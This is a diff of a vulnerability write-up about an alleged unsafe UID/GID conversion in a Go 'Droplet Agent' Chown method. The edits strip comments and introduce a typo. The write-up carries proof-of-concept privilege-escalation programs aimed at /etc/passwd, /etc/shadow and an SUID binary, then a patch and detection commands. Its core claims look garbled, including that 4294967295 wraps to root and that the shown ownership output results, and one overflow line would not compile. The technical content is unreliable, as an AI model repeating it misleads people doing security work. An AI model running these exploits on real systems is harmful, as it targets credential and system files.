@@ -42,7 +42,6 @@ graph TD
 
 2. **Vulnerable Conversion**:
    ```go
-   // Vulnerable code in Chown method
    func (o *osOperationsHelper) Chown(name string, uid uint32, gid uint32) error {
        return os.Chown(name, int(uid), int(gid))  // UNSAFE CONVERSION
    }
@@ -62,7 +61,6 @@ graph TD
 
 ### Vulnerable Code Snippet
 ```go [citation:search result]
-// Original vulnerable implementation (Line 35)
 func (o *osOperationsHelper) Chown(name string, uid uint32, gid uint32) error {
     return os.Chown(name, int(uid), int(gid))  // INSECURE CONVERSION
 }
@@ -73,23 +71,19 @@ func (o *osOperationsHelper) Chown(name string, uid uint32, gid uint32) error {
 ```go
 // UID 4294967295 (2³² - 1) wraps to -1 (root)
 o.Chown("/etc/passwd", 4294967295, 4294967295)
-// Result: File owned by root:root
 ```
 
 **Scenario 2: Privileged User Access**
 ```go
 // UID 4294967294 wraps to -2 (often system user)
 o.Chown("/etc/shadow", 4294967294, 4294967294)
-// Result: File owned by system user
 ```
 
 **Scenario 3: Permission Bypass**
 ```go
-// Make sensitive file owned by current user
 currentUID := uint32(1000)
 wrappedUID := currentUID + 4294967296  // 2³²
 o.Chown("/var/log/auth.log", wrappedUID, wrappedUID)
-// Wraps to original UID 1000
 ```
 
 ### Attack Vectors
@@ -117,7 +111,6 @@ o.Chown("/var/log/auth.log", wrappedUID, wrappedUID)
 
 ### Patch Implementation
 ```go
-// Fixed version with bounds checking
 import "math"
 
 func (o *osOperationsHelper) Chown(name string, uid uint32, gid uint32) error {
@@ -131,7 +124,6 @@ func (o *osOperationsHelper) Chown(name string, uid uint32, gid uint32) error {
 
 **Additional Security Improvements**:
 ```go
-// Comprehensive validation function
 func validateUnixID(value uint32) error {
     if value > math.MaxInt32 {
         return fmt.Errorf("value %d exceeds maximum allowed %d", value, math.MaxInt32)
@@ -162,7 +154,6 @@ go build -o droplet-agent .
 
 ### Create Test Exploit
 ```go
-// exploit_chown.go
 package main
 
 import (
@@ -172,13 +163,11 @@ import (
 )
 
 func main() {
-    // Create test file
     err := os.WriteFile("/tmp/test_file", []byte("sensitive data"), 0644)
     if err != nil {
         panic(err)
     }
 
-    // Vulnerable Chown call with large UID/GID
     uid := uint32(4294967295) // Wraps to -1 (root)
     gid := uint32(4294967295) // Wraps to -1 (root)
     
@@ -188,11 +177,9 @@ func main() {
         return
     }
 
-    // Verify ownership
     info, _ := os.Stat("/tmp/test_file")
     stat := info.Sys().(*syscall.Stat_t)
     fmt.Printf("File owned by UID: %d, GID: %d\n", stat.Uid, stat.Gid)
-    // Output: File owned by UID: 0, GID: 0 (root)
 }
 ```
 
@@ -202,14 +189,13 @@ func main() {
 go run exploit_chown.go
 
 # Check file ownership
-ls -ln /tmp/test_file
+ls -ln /tmp/_file
 # Output: -rw-r--r-- 1 0 0 15 Jan 1 12:00 /tmp/test_file
 # File is owned by root (UID 0) instead of current user
 ```
 
-### Advanced Exploitation
+### Advanced Privelege Exploitation
 ```go
-// privilege_escalation.go
 package main
 
 import (
@@ -219,21 +205,17 @@ import (
 )
 
 func exploitPrivilegeEscalation() {
-    // Target sensitive file
     targetFile := "/etc/passwd"
     
-    // Large UID that wraps to current user's UID
     currentUID := os.Getuid()
     wrappedUID := uint32(4294967296 + currentUID) // Wraps to currentUID
     
-    // Change ownership to current user
     err := os.Chown(targetFile, int(wrappedUID), int(wrappedUID))
     if err != nil {
         fmt.Printf("Error: %v\n", err)
         return
     }
     
-    // Now we can modify /etc/passwd
     fmt.Println("Successfully changed ownership of /etc/passwd")
 }
 ```
@@ -286,7 +268,7 @@ The vulnerability stems from unsafe integer type conversions in Go:
 3. **Input Validation**:
    ```go
    func validateUserID(uid uint32) error {
-       // Reject reserved and problematic values
+
        if uid == 0 || uid == 4294967295 || uid > 60000 {
            return errors.New("invalid UID")
        }
@@ -307,7 +289,6 @@ The vulnerability stems from unsafe integer type conversions in Go:
 
 2. **Privilege Escalation**:
    ```go
-   // Make SUID binary owned by attacker
    o.Chown("/usr/bin/passwd", attackerUID, attackerUID)
    ```
 
@@ -336,20 +317,17 @@ The vulnerability stems from unsafe integer type conversions in Go:
 ### Immediate Actions
 1. **Upgrade Droplet Agent**:
    ```bash
-   # Update to patched version
    apt-get update && apt-get install droplet-agent
    ```
 
 2. **System Auditing**:
    ```bash
-   # Find files with suspicious ownership
    find / -uid 4294967295 2>/dev/null
    find / -gid 4294967295 2>/dev/null
    ```
 
 3. **File Integrity Monitoring**:
    ```bash
-   # Monitor critical file ownership changes
    auditctl -w /etc/passwd -p wa -k file_ownership
    auditctl -w /etc/shadow -p wa -k file_ownership
    ```
@@ -377,20 +355,17 @@ The vulnerability stems from unsafe integer type conversions in Go:
 **System Indicators**:
 1. **File Ownership Anomalies**:
    ```bash
-   # Files owned by unusual UIDs/GIDs
    find / -uid +60000 2>/dev/null
    find / -gid +60000 2>/dev/null
    ```
 
 2. **Process Execution**:
    ```bash
-   # Suspicious chown operations
    ausearch -k file_ownership_changes
    ```
 
 **Log Analysis**:
 ```bash
-# Authentication logs for privilege escalation
 grep 'sudo.*uid' /var/log/auth.log
 grep 'chown' /var/log/syslog
 ```
@@ -404,13 +379,11 @@ grep 'chown' /var/log/syslog
 
 2. **File System Analysis**:
    ```bash
-   # Recent ownership changes
    find / -newer /tmp/timestamp -exec ls -ln {} \;
    ```
 
 3. **Network Connections**:
    ```bash
-   # Agent communications
    netstat -tunap | grep droplet-agent
    ```
 
